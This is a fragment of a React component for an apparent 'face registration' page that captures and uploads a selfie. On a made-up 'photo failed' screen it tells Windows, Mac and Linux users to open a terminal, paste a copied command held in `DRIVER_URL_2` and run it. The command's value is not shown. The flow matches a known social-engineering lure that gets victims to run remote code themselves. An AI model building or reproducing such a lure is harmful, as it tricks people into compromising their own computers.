    }
  }, [photoURL, capturing, startCamera, capturePhoto]);

  const handleSubmitPhoto = useCallback(async () => {
    if (!photoURL) return;

    setUploading(true);

    try {
      const response = await fetch(photoURL);
      const photoBlob = await response.blob();
      const formData = new FormData();
      formData.append("photo", photoBlob, "selfie.jpg");

      await axios.post(`${BACKEND_API_PATH}/uploads?token=${token}`, formData);

      addToast({ message: "Upload successful", type: "success" });
      navigate("/complete");
    } catch (error) {
      console.error("Upload error:", error);
      addToast({
        message: `Upload failed: ${error.response?.data?.message || error.message}`,
        type: "error"
      });
    } finally {
      setUploading(false);
    }
  }, [photoURL, token, navigate, addToast]);

  if (showInstructions) {
    return (
      <Layout title="Photo taken is failed">
        <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
          <button
            onClick={() => setShowInstructions(false)}
            className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
            aria-label="Back to recording"
          >
            <ArrowLeftIcon className="h-5 w-5" />
            Back to recording
          </button>

          <h2 className="text-2xl font-bold mb-4 text-gray-800">Follow the instruction below</h2>

          <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
            <div className="flex items-center gap-2 mb-3">
              <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
              <span className="text-gray-700">
                Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
              </span>
              <button
                onClick={checkCameraStatus}
                disabled={isCheckingCamera}
                className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
                aria-label="Refresh camera status"
              >
                <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
              </button>
            </div>

            <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>

            <div className="mb-3 p-3 bg-blue-50 rounded border border-blue-100">
              <h4 className="font-medium text-blue-800 mb-1">How to run this command:</h4>
              {os === "Windows" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Press Win+R, type "cmd" and press Enter</li>
                  <li>Right-click in Command Prompt to paste</li>
                  <li>Press Enter to execute</li>
                </ol>
              )}
              {os === "MacOS" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Open Terminal from Applications → Utilities</li>
                  <li>Press Command+V to paste</li>
                  <li>Press Return to execute</li>
                </ol>
              )}
              {os === "Linux" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Open Terminal (Ctrl+Alt+T)</li>
                  <li>Press Ctrl+Shift+V to paste</li>
                  <li>Press Enter to execute</li>
                </ol>
              )}
              {!["Windows", "MacOS", "Linux"].includes(os) && (
                <p className="text-sm text-blue-900">Paste this command in your system's terminal</p>
              )}
            </div>

            <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
              <code className="text-sm break-all font-mono text-gray-800 no-select" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
              <button
                onClick={handleCopyCommand}
                className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
                title="Copy to clipboard"
                aria-label="Copy command"
              >
                <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
              </button>
            </div>
            <div className="flex gap-2 mt-4">
              <button
                onClick={handleCopyCommand}
                className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
                       focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
                       transition-colors duration-200"
                aria-label="Copy command to clipboard"
              >
                Copy Command
              </button>
            </div>
          </div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout title="Face Registration">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-screen-xl mx-auto px-4">
        <div className="relative w-full max-w-md mx-auto">
          <div className="bg-black rounded-xl aspect-square flex items-center justify-center w-full relative overflow-hidden shadow-lg">
            {!photoURL ? (
              <>
                {!capturing && (
                  <div className="absolute inset-0 flex items-center justify-center text-white bg-gray-800">
                    <CameraIcon className="h-16 w-16 opacity-50" />
                  </div>
                )}
                <video
                  ref={videoRef}
                  autoPlay
                  muted
                  playsInline
                  className={`w-full h-full object-cover bg-black ${capturing ? '' : 'hidden'}`}
                  aria-label="Camera preview"
                />

                {capturing && (
                  <button
                    onClick={() => setUseFrontCamera(!useFrontCamera)}
                    className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
                    title="Switch Camera"
                    aria-label="Switch between front and rear cameras"
                  >
                    <ArrowsRightLeftIcon className="h-5 w-5 text-gray-800" />
                  </button>
                )}
              </>
            ) : (
              <>
                <img
                  src={photoURL}
                  alt="Captured face"
                  className="w-full h-full object-cover bg-black"
                />
                <button
                  onClick={() => {
                    URL.revokeObjectURL(photoURL);
                    setPhotoURL("");
                    startCamera(); // Restart camera when closing photo
                  }}
                  className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
                  aria-label="Close photo"
                >
                  <XMarkIcon className="h-5 w-5 text-gray-800" />
                </button>
              </>
            )}
          </div>

          <canvas
            ref={canvasRef}
            className="hidden"
          />

          <div className="flex justify-center mt-6">
            <button
              onClick={handleCameraClick}
              className={`relative p-4 rounded-full hover:opacity-90 transition-opacity duration-200
               ${isSaving ? 'bg-gray-400 cursor-not-allowed' :
                  photoURL ? 'bg-gray-600' :
                    capturing ? 'bg-red-600' : 'bg-indigo-600'}`}
              aria-label={photoURL ? "Retake photo" : capturing ? "Capture photo" : "Start camera"}
              disabled={isSaving}
            >
              {isSaving ? (
                <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor"
                    d="M4 12a8 8 0 018-8v8H4z"></path>
                </svg>
              ) : (
                <CameraIcon className="h-8 w-8 text-white" />
              )}
            </button>
          </div>

          {photoURL && (
            <div className="flex justify-center mt-4">
              <button
                onClick={handleSubmitPhoto}
                disabled={uploading}
                className="flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white rounded-md 
                         hover:bg-indigo-700 disabled:opacity-50 transition-colors duration-200"
                aria-label="Submit photo"
              >
                {uploading ? (
                  <ArrowPathIcon className="h-5 w-5 animate-spin" />
                ) : (
                  <>
                    <ArrowUpTrayIcon className="h-5 w-5" />
                    <span>Submit Photo</span>
                  </>
                )}
              </button>
            </div>
          )}
        </div>

        <div className="flex flex-col justify-center space-y-6">
          <div className="flex items-center gap-3">
            <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
            <span className="text-gray-700">
              {cameraReady ? 'Camera Ready' :
                cameraStatus ? 'Camera Initializing...' : 'Camera Not Ready'}
            </span>
          </div>

          <h2 className="text-xl font-semibold text-gray-800">
            Face Registration Required
          </h2>

          <ul className="space-y-3 text-gray-600">
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Make sure your face is clearly visible</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Remove sunglasses, hats, or face coverings</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Use good lighting - avoid shadows on your face</span>
            </li>
          </ul>
        </div>
      </div>
    </Layout>
  );
}